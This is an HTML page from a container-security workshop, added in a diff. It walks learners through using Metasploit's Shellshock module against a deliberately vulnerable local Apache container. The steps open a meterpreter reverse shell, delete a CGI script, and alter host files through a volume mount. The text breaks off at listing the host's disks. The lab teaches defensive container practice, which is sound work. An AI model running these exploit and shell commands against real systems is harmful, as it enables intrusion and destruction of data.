@@ -1,0 +1,1727 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Metasploit :: BUILD-A-CONTAINER WORKSHOP</title>
+    <link rel="canonical" href="https://redhat-scholars.github.io/build-a-container/intro-container-workshop/1.0/METASPLOIT/containers-and-security.html">
+    <link rel="prev" href="../deploy-container.html">
+    <link rel="next" href="../DATABASES/databases-and-containers.html">
+    <meta name="description" content="Introduction to Containers, Container Security and Container Tools including Podman and Buildah">
+    <meta name="keywords" content="docker, podman, buildah, skopeo, security, secure containers, containers, Red Hat, RHEL, Linux, Containerization, cloud, build a container, workshop, cloud native, openshift">
+    <meta name="generator" content="Antora 2.3.4">
+    <link rel="stylesheet" href="../../../_/css/site.css">
+<link rel="icon" href="../../../_/img/favicon.ico" type="image/x-icon">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  </head>
+  <body class="article">
+<header class="header">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-RCLP96B4SM"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-RCLP96B4SM');
+</script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script type="text/javascript">
+
+   $( document ).ready(function() {
+    $('li.version a, a.version').click(function() {
+            var querystring = window.location.search;
+            var href = $(this).attr('href');
+            location.href = href + querystring;
+            return false;
+      });
+  });
+    
+  </script>
+  <style>
+    /* override master stylesheet properties for this partial here */
+
+    .navbar-item {
+      flex: unset;
+    }
+
+    .doc {
+      max-width: unset;
+    }
+
+    .bac-red {
+        color: red;
+    }
+    .bac-h1 {
+        font-size: 1.8em;
+        margin: auto;
+        display:table;
+        color: red;
+    }
+
+  </style>
+
+  <nav class="navbar">
+    <div class="navbar-brand">
+      <a class="navbar-item" href="https://developers.redhat.com" target="_blank"><img
+          src="../../../_/img/header_logo.png" height="40px" alt="Red Hat Developer Program"></a>
+      <a class="navbar-item" style="font-size: 24px; color: white" href="https://redhat-scholars.github.io/build-a-container">BUILD-A-CONTAINER WORKSHOP</a>
+      <button class="navbar-burger" data-target="topbar-nav">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+    </div>
+        <div id="topbar-nav" class="navbar-menu">
+      <div class="navbar-end">
+        <a class="navbar-item" href="https://developers.redhat.com/ebooks/" target="_blank">Books</a>
+        <a class="navbar-item" href="https://developers.redhat.com/cheatsheets/" target="_blank">Cheat Sheets</a>
+        <a class="navbar-item" href="https://developers.redhat.com/events/" target="_blank">Upcoming Events</a>
+        <div class="navbar-item has-dropdown is-hoverable">
+          <a class="navbar-link" href="#">More Tutorials</a>
+          <div class="navbar-dropdown">
+            <a class="navbar-item" href="https://redhat-scholars.github.io/outer-loop-guides/" target="_blank">Outer Loop</a>
+            <a class="navbar-item" href="https://redhat-scholars.github.io/openshift-starter-guides/" target="_blank">OpenShift Starter</a>
+            <a class="navbar-item" href="https://redhat-scholars.github.io/kubernetes-tutorial/" target="_blank">Kubernetes</a>
+            <a class="navbar-item" href="https://redhat-scholars.github.io/istio-tutorial/" target="_blank">Istio</a>
+            <a class="navbar-item" href="https://redhat-developer-demos.github.io/quarkus-tutorial/" target="_blank">Quarkus</a>
+            <a class="navbar-item" href="https://redhat-developer-demos.github.io/knative-tutorial/" target="_blank">Knative</a>
+            <a class="navbar-item" href="https://redhat-scholars.github.io/tekton-tutorial/" target="_blank">Tekton</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </nav>
+</header><div class="body">
+<div class="nav-container" data-component="intro-container-workshop" data-version="1.0">
+  <aside class="nav">
+    <div class="panels">
+<div class="nav-panel-menu is-active" data-panel="menu">
+  <nav class="nav-menu">
+    <h3 class="title"><a href="../index.html" class=" query-params-link">BUILD-A-CONTAINER</a></h3>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="0">
+<ul class="nav-list">
+  <li class="nav-item" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <a class="nav-link" href="../introduction.html">Setup</a>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../introduction.html#open_code_server">Code Server</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../introduction.html#open_code_server_terminal">Open Terminal</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../introduction.html#open_code_server_terminal_commands">Issuing Terminal Commands</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../introduction.html#local_browser">Local Browser</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <span class="nav-text">&#8203;</span>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <span class="nav-text"><em>Module I</em></span>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <a class="nav-link" href="../container-anatomy.html">Container Anatomy</a>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../container-anatomy.html#what_makes_up_a_container">What makes up a Container?</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../container-anatomy.html#container_image_format">Container Image Format</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../container-anatomy.html#container_file">Containerfile</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../container-anatomy.html#container_identification">Container Identification</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../container-anatomy.html#container_runtime">Container Runtime</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../container-anatomy.html#container_tools">Container Tools</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../container-anatomy.html#container_registries">Container Registries</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../container-anatomy.html#more_information">More information</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <a class="nav-link" href="../podman-intro.html">Running Containers</a>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../podman-intro.html#run_container">Add a website</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../podman-intro.html#enter_container">Look inside a container</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../podman-intro.html#copy_data">Copying data out</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../podman-intro.html#committing_containers">Committing Containers</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../podman-intro.html#stop_container">Stopping Containers</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../podman-intro.html#remove_containers">Removing Containers</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../podman-intro.html#rerunning_container">Re-running Containers</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <a class="nav-link" href="../container-persistence.html">Persistence and Containers</a>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../container-persistence.html#mounting_volumes">Mounting Volumes</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../container-persistence.html#test_mount">Testing the Volume Mount</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <span class="nav-text">&#8203;</span>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <span class="nav-text"><em>Module II</em></span>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <a class="nav-link" href="../containers-and-security.html">Container Security</a>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <a class="nav-link" href="../build-your-own-container.html">Build a Container</a>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../build-your-own-container.html">Build your own Secure Container</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../build-your-own-container-containerfile.html">Buildah and Containerfiles</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <a class="nav-link" href="../deploy-container.html">Deploying to OpenShift</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="0">
+<ul class="nav-list">
+  <li class="nav-item" data-depth="1">
+    <span class="nav-text">&#8203;</span>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <span class="nav-text"><em>Extensions</em></span>
+  </li>
+  <li class="nav-item is-current-page" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <a class="nav-link" href="containers-and-security.html">Metasploit</a>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="#exploit_containers">Exploit a Container</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="#run_containers_responsibly">Run Containers Responsibly</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="#test_secure_container">Testing our Secure Container</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <a class="nav-link" href="../DATABASES/databases-and-containers.html">Containerized Databases</a>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <a class="nav-link" href="../PODMAN_COMPOSE/compose-container.html">Docker Compose &amp; Pods</a>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <a class="nav-link" href="../PODMAN_ROOTLESS/podman-rootless.html">Rootless Containers</a>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <span class="nav-text">&#8203;</span>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <a class="nav-link" href="../references.html"><em>References</em></a>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <a class="nav-link" href="../contributions.html"><em>Contributions</em></a>
+  </li>
+</ul>
+  </li>
+</ul>
+  </nav>
+</div>
+<div class="nav-panel-explore" data-panel="explore">
+  <div class="context">
+    <span class="title">BUILD-A-CONTAINER</span>
+    <span class="version">1.0</span>
+  </div>
+  <ul class="components">
+    <li class="component is-current">
+      <span class="title">BUILD-A-CONTAINER</span>
+      <ul class="versions">
+        <li class="version is-current is-latest">
+          <a href="../index.html">1.0</a>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</div>
+    </div>
+  </aside>
+</div>
+<main class="article">
+<div class="toolbar" role="navigation">
+<button class="nav-toggle"></button>
+  <a href="../index.html" class="home-link"></a>
+<nav class="breadcrumbs" aria-label="breadcrumbs">
+  <ul>
+    <li><a href="../index.html">BUILD-A-CONTAINER</a></li>
+    <li><a href="containers-and-security.html">Metasploit</a></li>
+  </ul>
+</nav>
+  <div class="edit-this-page"><a href="file:///Users/bfarr/projects/build-a-container/documentation/modules/METASPLOIT/pages/containers-and-security.adoc">Edit this Page</a></div>
+</div>
+  <div class="content">
+<article class="doc">
+<h1 class="page">Metasploit</h1>
+<div id="preamble">
+<div class="sectionbody">
+<div class="paragraph">
+<p><em>25 MINUTE EXERCISE</em></p>
+</div>
+<div class="paragraph">
+<p>In Module II you saw a video of how the Metasploit tool can be used to gain access into a container and a host that has vulnerabilities. in this extension exercise you can try it out for yourself.</p>
+</div>
+<div class="admonitionblock note">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-note" title="Note"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>Before running this exercise you will have needed to complete Module II.</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="exploit_containers"><a class="anchor" href="#exploit_containers"></a>Exploiting a Vulnerable Container</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>In order to get a sense of how consequential these security exploits can be, let&#8217;s exploit some of the issues in the containers we already have running</p>
+</div>
+<div class="paragraph">
+<p><span class="image right"><img src="_images/Shellshock-logo.png" alt="Shellshock logo" width="50"></span>
+Our <code>quay.io/bfarr/container-workshop-httpd:0.0.6</code> has a huge vulnerability in it that is further excerbated by the manner in which we&#8217;ve run our container.  The vulnerability is the (in)famous <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="noopener">Shellshock vulnerability</a></p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>First ensure the <code>quay.io/bfarr/container-workshop-httpd:0.0.6</code> is running by running the following command in the terminal</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">podman ps</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+</li>
+<li>
+<p>You should see output something like below.  If you don&#8217;t, then run the container as per <a href="container-persistence.html?USER=%USER%&amp;CLUSTER_SUBDOMAIN=%CLUSTER_SUBDOMAIN%#podman_run_httpd" target="_blank" rel="noopener">here</a></p>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">CONTAINER ID  IMAGE                                            COMMAND               CREATED      STATUS          PORTS                 NAMES
+4e9c38ac10eb  quay.io/bfarr/container-workshop-httpd:0.0.6  /usr/sbin/httpd -...  3 hours ago  Up 3 hours ago  0.0.0.0:8081-&gt;80/tcp  my-web-server</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+</li>
+</ol>
+</div>
+<div class="sect2">
+<h3 id="using_metasploit"><a class="anchor" href="#using_metasploit"></a>Using Metasploit</h3>
+<div class="paragraph">
+<p>We&#8217;re going to use a tool called <a href="https://www.metasploit.com/">metasploit</a> (which has already been installed on your VM instance) to exploit the vulnerability (with alarming ease).</p>
+</div>
+<div class="paragraph">
+<p>We are going to run metasploit as a non-root user in another terminal which we&#8217;ll refer to as <strong>Terminal 2</strong> in the tabs below.  If you haven&#8217;t already, you can split your terminal to open a new, non-root, shell</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="_images/terminal-split-annotated.jpg" alt="terminal split annotated">
+</div>
+<div class="title">Figure 1. Terminal Split button</div>
+</div>
+<div class="paragraph">
+<p>Then run the following commands in the newly created terminal:</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset1_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset1_terminal-2">
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Start up metasploit in your terminal by running the following command:</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">msfconsole \
+    -x \<i class="conum" data-value="1"></i><b>(1)</b>
+"use multi/http/apache_mod_cgi_bash_env_exec; <i class="conum" data-value="2"></i><b>(2)</b>
+set RHOSTS <a href="http://127.0.0.1:8081/cgi-bin/log-visitor.sh" class="bare">http://127.0.0.1:8081/cgi-bin/log-visitor.sh</a>; <i class="conum" data-value="3"></i><b>(3)</b>
+set LHOST $(dig +short myip.opendns.com @resolver1.opendns.com)" <i class="conum" data-value="4"></i><b>(4)</b></code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>The <code>-x</code> option allows us to pass commands directly into metasploit (see following explanations of each).  We use this to save setup time</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="2"></i><b>2</b></td>
+<td>This is a metasploit module that plugs into the console.  There is a whole library of modules that are used with metasploit.  This one specifically targets the shellshock vulnerability via Apache&#8217;s cgi-bin support</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="3"></i><b>3</b></td>
+<td>This is the address of the server target URL of a cgi-bin script (which we&#8217;re running locally in a container)</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="4"></i><b>4</b></td>
+<td>The public ip address of the VM instance (as reported by <code>dig</code>).  This is necessary for how metasploit works</td>
+</tr>
+</table>
+</div>
+<div class="sidebarblock">
+<div class="content">
+<div class="title">NOTE</div>
+<div class="paragraph">
+<p>If asked if you want to setup a new database, answer <strong>no</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Would you like to use and setup a new database (recommended)?</pre>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+</li>
+<li>
+<p>When it&#8217;s done initializing, you should see output something like this (ASCII art, "tip", and <code>LHOST</code> will vary)</p>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash"> ** Welcome to Metasploit Framework Initial Setup **
+    Please answer a few questions to get started.
+
+
+Would you like to use and setup a new database (recommended)? no
+
+ ** Metasploit Framework Initial Setup Complete **
+
+
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
+
+
+       =[ metasploit v6.2.9-dev-                          ]
++ -- --=[ 2229 exploits - 1177 auxiliary - 398 post       ]
++ -- --=[ 864 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: You can pivot connections over sessions
+started with the ssh_login modules
+
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+RHOSTS =&gt; <a href="http://127.0.0.1:8081/cgi-bin/log-visitor.sh" class="bare">http://127.0.0.1:8081/cgi-bin/log-visitor.sh</a>
+LHOST =&gt; 3.25.173.38
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;</code></pre>
+</div>
+</div>
+</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>To ensure everything&#8217;s setup right, we can check whether our setup is currently targeting a vulnerable container</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset2_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset2_terminal-2">
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">check</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Which should report the following output if successful:</p>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">[+] 127.0.0.1:8081 - The target is vulnerable.</code></pre>
+</div>
+</div>
+<div class="sidebarblock">
+<div class="content">
+<div class="title">TIP</div>
+<div class="paragraph">
+<p>If you get a message that the target is not vulnerable (and you are expecting it to be, make sure the <code>quay.io/bfarr/container-workshop-httpd:0.0.6</code> is running</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="exploit_shellshock"><a class="anchor" href="#exploit_shellshock"></a>Exploiting Shellshock</h3>
+<div class="paragraph">
+<p>Now it&#8217;s time to exploit our running container.  This is as simple as running the following inside the metasploit console (it causes the <code>multi/http/apache_mod_bash_env_exec</code> module to be run with the configuration we set up in the previous section)</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset3_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset3_terminal-2">
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>With all the setup we did previously, you can now simply run this command in this terminal to exploit the vulnerability on the container</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">exploit</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+</li>
+<li>
+<p>After a few moments you should see the following output, ending with the a <code>meterpreter</code> console</p>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">[-] Handler failed to bind to 13.239.27.229:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (984904 bytes) to 13.239.27.229
+[*] Meterpreter session 1 opened (172.16.249.211:4444 -&gt; 13.239.27.229:42046) at 2021-05-30 07:31:45 +0000
+
+meterpreter &gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+</li>
+<li>
+<p>Next type in the following to get a shell and output something like the following</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">shell</code></pre>
+</div>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">Process 79 created.
+Channel 1 created.</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+</li>
+<li>
+<p>One thing you&#8217;ll notice is a lack of a prompt after the previous output, and even though we don&#8217;t see it, we&#8217;re able to enter bash shell command now.  Just to make our hack more comfortable, paste this command into Terminal 2</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">/usr/bin/script -qc /bin/bash /dev/null</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+<div class="paragraph">
+<p>You should now get a bash style prompt that will look something like this:</p>
+</div>
+</li>
+</ol>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">[root@b0cfa8015a4c cgi-bin]#</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="wreaking_havoc"><a class="anchor" href="#wreaking_havoc"></a>Wreaking havoc from within the container</h3>
+<div class="paragraph">
+<p>Now that we&#8217;re in the container, let&#8217;s show the kind of vulnerabilities we&#8217;ve exposed.</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset4_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset4_terminal-2">
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>First, notice the user we&#8217;re running as:</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">whoami</code></pre>
+</div>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">root</code></pre>
+</div>
+</div>
+</li>
+<li>
+<p>So we&#8217;re running as the <code>root</code> user inside the container.  This is because we ran our container as root and setup our apache server to run as whichever user started the <code>httpd</code> process (in this case, <code>root</code>).</p>
+</li>
+<li>
+<p>Now let&#8217;s take a look at where we are in the container by issuing these two commands and reviewing the output (yours might vary slightly):</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">pwd &amp;&amp; ls -l</code></pre>
+</div>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">/var/www/cgi-bin
+total 4
+-rwxr-xr-x. 1 root root 452 May 28 03:24 log-visitor.sh</code></pre>
+</div>
+</div>
+</li>
+<li>
+<p>This is the script that logs visitors in our guestbook.  And notice that as root we have access to this script.  Feel free to look at the script</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">cat log-visitor.sh</code></pre>
+</div>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">#!/bin/bash
+
+VISITOR=$(echo $QUERY_STRING | sed -rn 's/visitor=([^&amp;]+)&amp;?.*/\1/p')
+echo $VISITOR &gt;&gt; /var/log/www/visitor_info.txt
+
+cat &lt;&lt;EOF
+Content-type: text/html
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;title&gt;Thank You&lt;/title&gt;
+&lt;h1&gt;Thank you ${VISITOR}!&lt;/h1&gt;
+I have collected your info as user: $(whoami) &lt;br&gt; &lt;br&gt;
+
+Click &lt;a href=/hello.html&gt;here&lt;/a&gt; to register another visitor.
+&lt;/body&gt;
+&lt;/html&gt;
+EOF</code></pre>
+</div>
+</div>
+</li>
+<li>
+<p>Notice that the logbook directory is specified in the shell script.  We&#8217;ll go there next.  But in the meantime we can damage the container by deleting the script</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">rm -f log-visitor.sh</code></pre>
+</div>
+</div>
+</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>Now if you try navigate to the guestbook at the following URL in the <strong>Preview Browser</strong></p>
+</div>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash"><a href="http://localhost:8081/hello.html" class="bare">http://localhost:8081/hello.html</a></code></pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="_images/apache-guestbook-page.jpg" alt="apache guestbook page">
+</div>
+<div class="title">Figure 2. The guestbook might now work so well anymore&#8230;&#8203;</div>
+</div>
+<div class="paragraph">
+<p>and enter a name into the Name: field and press the <code>Log to Guestbook</code> button you will get an error</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="_images/broken-guestbook.png" alt="broken guestbook">
+</div>
+</div>
+<div class="admonitionblock note">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-note" title="Note"></i>
+</td>
+<td class="content">
+<div class="title">Ability to impact or sabotage running container</div>
+<div class="paragraph">
+<p>So far we&#8217;ve just impacted the running container.  To fix it we could just startup a new one.  But the vulnerabilities don&#8217;t end there</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+</div>
+<div class="sect2">
+<h3 id="wreaking_havoc_host"><a class="anchor" href="#wreaking_havoc_host"></a>Wreaking havoc on the Host</h3>
+<div class="paragraph">
+<p>One key consideration when running containers as a given user is that this generally maps directly to a user on the host operating system.  As we&#8217;ll see, this is particularly dangerous for a user such as <code>root</code> which exists on every system and has elevated privileges.  One of the places of "interaction" between the container and the host operating system where we can exploit this is via the <strong>volume mounts</strong> we were using</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset5_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset5_terminal-2">
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>From within the same metasploit shell, let&#8217;s poke around the directory where visitors were getting logged</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">cd /var/log/www &amp;&amp; ls -l</code></pre>
+</div>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">total 8
+-rw-r--r--. 1 1001 1001 73 May 28 08:50 README.md
+drwxr-xr-x. 2 1001 1001 22 May 28 08:50 cgi-bin
+drwxr-xr-x. 2 1001 1001 29 May 28 08:50 oval
+drwxr-xr-x. 2 1001 1001 34 May 28 08:50 sql
+-rw-r--r--. 1 root root  5 May 30 07:31 visitor_info.txt</code></pre>
+</div>
+</div>
+</li>
+<li>
+<p>This is particularly concerning as you&#8217;ll notice that this mirrors the files you see in the <code>container-workshop</code> directory of your host (as you can verify from the <strong>Explorer</strong>)</p>
+</li>
+<li>
+<p>What&#8217;s worse is that you are <code>root</code> so you can mess with stuff now in this directory (and below) of <strong>the host system</strong>.  For instance, enter the following commands:</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">echo "You've been hax0red" &gt;&gt; visitor_info.txt &amp;&amp; chmod a+w visitor_info.txt</code></pre>
+</div>
+</div>
+</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>If it&#8217;s not open already, open the visitor_info.txt from the <strong>Explorer</strong>.  It will now look something like this:</p>
+<div class="imageblock">
+<div class="content">
+<img src="_images/hax0red.png" alt="hax0red">
+</div>
+</div>
+<div class="admonitionblock note">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-note" title="Note"></i>
+</td>
+<td class="content">
+<div class="title">Access to host filesystem via volume mounts</div>
+<div class="paragraph">
+<p>This demonstrates that a malicious intruder could actually read and change files on the host system, provided access was afforded them through our volume mounts.  But it gets even worse in this case because of our use of the <code>privileged</code> flag.  This gives the container OS level capabilities, which we&#8217;ll exploit to potentially devastating effect next</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+</li>
+<li>
+<p>Enter the following command to look at the disks(!) on the host operating system</p>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset6_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset6_terminal-2">
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">fdisk -l</code></pre>
+</div>
